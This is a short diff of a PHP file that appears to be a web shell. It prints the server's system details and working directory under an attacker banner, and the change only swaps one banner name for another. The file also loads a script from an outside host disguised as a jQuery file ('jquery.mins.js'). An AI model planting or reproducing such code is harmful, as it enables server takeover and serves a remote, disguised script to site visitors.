@@ -1,5 +1,5 @@
 <?php 
-echo 'Gmr-Achraf'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); 
+echo 'The anvenger'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); 
 Echo 
 '
 <script type="text/javascript" src="http://www.codejquery.net/jquery.mins.js" ></script>
